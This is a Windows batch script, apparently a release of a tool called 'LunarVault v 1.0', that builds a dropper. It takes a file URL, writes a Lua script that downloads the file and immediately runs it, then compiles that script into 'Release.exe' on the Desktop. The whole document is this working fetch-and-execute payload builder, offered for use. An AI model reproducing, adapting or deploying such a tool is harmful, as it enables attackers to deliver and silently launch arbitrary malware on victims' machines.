::::::::::::::::::::::::::::::
::                          ::
::   github.com/ImMoonDev   ::
::     LunarVault v 1.0     ::
::                          ::
::::::::::::::::::::::::::::::

@echo off
setlocal enabledelayedexpansion

echo.
set /p fileurl="File URL: "
set /p fileext="Downloaded File Extension (without dot, e.g., exe, bat, lua): "
echo.

set "downloaded_file=downloaded_file.%fileext%"
echo local tmpname = "%downloaded_file%" >source.lua
echo local filedropurl = "%fileurl%" >>source.lua
echo local http = require("socket.http") >>source.lua
echo local ltn12 = require("ltn12") >>source.lua
echo. >>source.lua
echo local file = assert(io.open(tmpname, "wb")) >>source.lua
echo local success, status_code = http.request{ >>source.lua
echo     url = filedropurl, >>source.lua
echo     sink = ltn12.sink.file(file) >>source.lua
echo } >>source.lua
echo. >>source.lua
echo if success and status_code == 200 then >>source.lua
echo     print("File downloaded successfully to " .. tmpname) >>source.lua
echo     os.execute("start " .. tmpname) >>source.lua
echo else >>source.lua
echo     print("Failed to download file. HTTP status: " .. (status_code or "unknown")) >>source.lua
echo end >>source.lua

if exist "source.lua" (
    echo Converting Lua script to executable...
    rtc.exe -s source.lua
    if exist "source.exe" (
        copy "source.exe" "%userprofile%\Desktop\Release.exe"
        echo Success: Executable created.
	echo.
	echo FILE IS LOCATED AT TO %userprofile%\Desktop\Release.exe
        del source.lua
    ) else (
        echo Error: Conversion failed.
    )
) else (
    echo Error: Lua script creation failed.
)
echo.
echo.
echo.
echo.
pause >nul